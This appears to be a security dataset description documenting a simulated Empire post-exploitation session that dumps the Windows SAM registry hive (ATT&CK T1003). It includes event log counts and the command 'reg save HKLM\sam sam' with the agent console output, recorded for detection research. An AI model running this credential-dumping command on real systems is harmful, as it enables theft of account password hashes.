
# Empire Reg Dump SAM

An adversary with administrator privileges can use the windows reg utility to dump the SAM registry hive.

## Technique(s) ID

T1003

## Creators

Roberto Rodriguez [@Cyb3rWard0g](https://twitter.com/Cyb3rWard0g)

## dataset

[empire_reg_dump_sam.tar.gz](./empire_reg_sam.tar.gz)

## Nnetwork Environment

Shire

## Time Taken

2019-03-19022540

## About this file

| log_name                                 | task                                                   |   record_number |
|------------------------------------------|--------------------------------------------------------|-----------------|
| Windows PowerShell                       | Pipeline Execution Details                             |             186 |
| Security                                 | Filtering Platform Connection                          |             339 |
| Security                                 | User Account Management                                |              74 |
| Security                                 | Token Right Adjusted Events                            |              49 |
| Security                                 | Process Creation                                       |               8 |
| Security                                 | Logoff                                                 |               7 |
| Security                                 | Sensitive Privilege Use                                |               7 |
| Security                                 | Authorization Policy Change                            |               6 |
| Security                                 | Group Membership                                       |               5 |
| Security                                 | Logon                                                  |               5 |
| Security                                 | Special Logon                                          |               5 |
| Security                                 | Process Termination                                    |               4 |
| Security                                 | Detailed File Share                                    |               2 |
| Security                                 | Other Object Access Events                             |               1 |
| Microsoft-Windows-Sysmon/Operational     | Image loaded (rule: ImageLoad)                         |             354 |
| Microsoft-Windows-Sysmon/Operational     | Process accessed (rule: ProcessAccess)                 |             278 |
| Microsoft-Windows-Sysmon/Operational     | Network connection detected (rule: NetworkConnect)     |             114 |
| Microsoft-Windows-Sysmon/Operational     | Registry object added or deleted (rule: RegistryEvent) |              69 |
| Microsoft-Windows-Sysmon/Operational     | Pipe Connected (rule: PipeEvent)                       |              24 |
| Microsoft-Windows-Sysmon/Operational     | File created (rule: FileCreate)                        |              22 |
| Microsoft-Windows-Sysmon/Operational     | Process Create (rule: ProcessCreate)                   |               7 |
| Microsoft-Windows-Sysmon/Operational     | Registry value set (rule: RegistryEvent)               |               4 |
| Microsoft-Windows-Sysmon/Operational     | Pipe Created (rule: PipeEvent)                         |               1 |
| Microsoft-Windows-PowerShell/Operational | Executing Pipeline                                     |             153 |

## Empire Activity

```
shell reg save HKLM\sam sam
```

```
[*] Tasked FD6A3MGY to run TASK_SHELL
[*] Agent FD6A3MGY tasked with task ID 8
(Empire: FD6A3MGY) > ..Command execution completed.

(Empire: FD6A3MGY) >
```